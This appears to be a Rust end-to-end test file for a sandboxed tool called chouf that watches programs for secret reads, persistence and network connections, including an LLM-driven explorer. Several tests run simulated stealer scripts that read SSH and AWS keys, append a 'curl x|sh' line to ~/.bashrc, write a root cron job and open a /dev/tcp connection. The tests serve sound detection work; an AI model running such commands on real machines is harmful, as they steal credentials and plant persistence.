//! Real runs through podman. Needs rootless podman and pulls ubuntu:24.04 once: `cargo test -- --include-ignored`.

use std::path::PathBuf;
use std::process::Command;

static RUN: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn chouf(args: &[&str]) -> (i32, String, serde_json::Value) {
    chouf_env(args, &[])
}

fn chouf_env(args: &[&str], env: &[(&str, &str)]) -> (i32, String, serde_json::Value) {
    // tests run in parallel: each run gets its own data directory
    let n = RUN.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
    let data = std::env::temp_dir().join(format!("chouf-e2e-{}-{n}", std::process::id()));
    let out = Command::new(env!("CARGO_BIN_EXE_chouf"))
        .args(args)
        .env("CHOUF_DATA", &data)
        .envs(env.iter().copied())
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    let session = text
        .lines()
        .find_map(|l| l.strip_prefix("session: ").map(|r| r.split("  (").next().unwrap()))
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            panic!(
                "no session:\n{text}\n{}",
                String::from_utf8_lossy(&out.stderr)
            )
        });
    let json =
        serde_json::from_slice(&std::fs::read(session.join("report.json")).unwrap()).unwrap();
    let _ = std::fs::remove_dir_all(data);
    (out.status.code().unwrap(), text, json)
}

fn has(j: &serde_json::Value, kind: &str, path: &str) -> bool {
    j["findings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|f| f["kind"] == kind && f["path"] == path)
}

#[test]
#[ignore]
fn a_stealer_is_caught() {
    let script = "cat ~/.ssh/id_ed25519 > /dev/null; echo 'curl x|sh' >> ~/.bashrc; \
                  echo '* * * * * root /x' > /etc/cron.d/u; echo ok > /usr/local/bin/tool";
    let (code, text, j) = chouf(&["run", "--no-net", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    assert!(has(&j, "secret", "~/.ssh/id_ed25519"), "{text}");
    assert!(has(&j, "persistence", "~/.bashrc"), "{text}");
    assert!(has(&j, "persistence", "/etc/cron.d/u"), "{text}");
    assert!(has(&j, "other", "/usr/local/bin/tool"), "{text}");
    assert_eq!(
        j["findings"].as_array().unwrap().len(),
        4,
        "only what it did:\n{text}"
    );
    assert_eq!(j["exit_code"], 0);
    assert_eq!(j["token"].as_str().unwrap().len(), 16);
}

#[test]
#[ignore]
fn a_quiet_program_is_clean() {
    let (code, text, j) = chouf(&[
        "run",
        "--no-net",
        "--",
        "sh",
        "-c",
        "ls / > /dev/null; cat /etc/os-release; echo hi > /tmp/scratch",
    ]);
    assert_eq!(code, 0, "{text}");
    let f = j["findings"].as_array().unwrap();
    assert!(f.iter().all(|f| f["kind"] == "other"), "{text}");
    assert!(text.contains("/tmp/scratch"));
}

#[test]
#[ignore]
fn the_time_limit_holds() {
    let t = std::time::Instant::now();
    let (_, text, j) = chouf(&["run", "--no-net", "--timeout", "2", "--", "sleep", "60"]);
    assert_eq!(j["timed_out"], true, "{text}");
    assert!(j["exit_code"].is_null());
    assert!(t.elapsed().as_secs() < 30);
}

/// Needs the kernel tracer too (sudo ./trace/install.sh); skipped with a message when it is not running.
#[test]
#[ignore]
fn the_tracer_names_who_did_it_and_where_it_connected() {
    if !std::path::Path::new("/run/chouf-trace.sock").exists() {
        eprintln!("skipped: chouf-trace is not running");
        return;
    }
    // a subshell reads the key, a child of the script writes .bashrc, bash connects to the sandbox's DNS forwarder
    let script = "k=$(cat ~/.ssh/id_ed25519); sh -c 'echo x >> ~/.bashrc'; \
                  bash -c 'exec 3<>/dev/tcp/169.254.1.1/53' 2>/dev/null; exit 3";
    let (code, text, j) = chouf(&["run", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    let by = |path: &str| -> Vec<String> {
        let f = j["findings"].as_array().unwrap().iter().find(|f| f["path"] == path).unwrap_or_else(|| panic!("{path}:\n{text}"));
        f["by"].as_array().unwrap().iter().map(|b| b.as_str().unwrap().to_string()).collect()
    };
    assert_eq!(by("~/.ssh/id_ed25519"), vec!["cat /root/.ssh/id_ed25519"], "{text}");
    assert_eq!(by("~/.bashrc"), vec!["sh -c echo x >> ~/.bashrc"], "{text}");
    let a = &j["activity"];
    let programs: Vec<(u64, &str)> = a["programs"].as_array().unwrap().iter()
        .map(|p| (p["depth"].as_u64().unwrap(), p["command"].as_str().unwrap())).collect();
    assert_eq!(programs[0].0, 0, "{text}");
    assert!(programs[0].1.starts_with("sh -c k=$(cat"), "{text}");
    for child in ["cat /root/.ssh/id_ed25519", "sh -c echo x >> ~/.bashrc", "bash -c exec 3<>/dev/tcp/169.254.1.1/53"] {
        assert!(programs.contains(&(1, child)), "{child} not under the script:\n{text}");
    }
    assert_eq!(a["programs"][0]["exit"], 3, "the script's exit code:\n{text}");
    let conns = a["connections"].as_array().unwrap();
    assert!(conns.iter().any(|c| c["ip"] == "169.254.1.1" && c["port"] == 53 && c["by"].as_str().unwrap().starts_with("bash -c")), "{text}");
    assert_eq!(a["events_lost"], false);
}

#[test]
#[ignore]
fn without_the_tracer_the_report_says_so() {
    // a socket path nobody serves stands for "not installed"
    let (_, text, j) = chouf_env(&["run", "--no-net", "--", "true"], &[("CHOUF_TRACE_SOCK", "/nonexistent/chouf-trace.sock")]);
    assert!(j["activity"]["unavailable"].as_str().unwrap().contains("chouf-trace"), "{text}");
}

/// The explorer's loop end to end, with a scripted model: no network, no key, same answers every time.
#[test]
#[ignore]
fn the_explorer_types_answers_waits_and_reports_its_verdict() {
    let dir = std::env::temp_dir().join(format!("chouf-explore-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let tool = dir.join("tool");
    std::fs::write(&tool, "case \"$1\" in\n  ask) printf 'Continue? [y/N] '; read a; [ \"$a\" = y ] && cat ~/.aws/credentials > /dev/null && echo yes;;\n  *) echo 'usage: tool ask';;\nesac\n").unwrap();
    let script = dir.join("answers.jsonl");
    std::fs::write(&script, [
        r#"{"action":"run","argv":["sh","/input/tool","ask"],"stdin":"y\n","why":"answer the prompt"}"#,
        r#"{"action":"wait","seconds":1,"why":"anything later?"}"#,
        r#"{"action":"stop","why":"seen enough"}"#,
        r#"{"level":"suspicious","summary":"It reads AWS keys after a yes.","points":[{"says":"asks to continue","does":"reads ~/.aws/credentials","assessment":"unexplained"}]}"#,
    ].join("\n")).unwrap();
    let (code, text, j) = chouf_env(
        &["explore", "--no-net", "--file", tool.to_str().unwrap(), "--", "sh", "/input/tool"],
        &[("CHOUF_FAKE_LLM", script.to_str().unwrap())],
    );
    assert_eq!(code, 1, "{text}");
    let steps: Vec<&str> = j["exploration"]["steps"].as_array().unwrap().iter().map(|s| s["did"].as_str().unwrap()).collect();
    assert_eq!(steps.len(), 3, "{text}");
    assert!(steps[1].starts_with("$ sh /input/tool ask  (typed \"y\\n\") · exit 0"), "{text}");
    assert!(steps[2].starts_with("waited 1 s"), "{text}");
    assert!(has(&j, "secret", "~/.aws/credentials"), "the typed answer reached the program:\n{text}");
    assert_eq!(j["exploration"]["verdict"]["level"], "suspicious");
    assert!(text.contains("SUSPICIOUS"), "{text}");
    // the program's output reached the model fenced as untrusted
    let prompts = std::fs::read_to_string(script.with_extension("prompts")).unwrap();
    assert!(prompts.contains("<<<UNTRUSTED\nusage: tool ask"), "{prompts}");
    let _ = std::fs::remove_dir_all(dir);
}

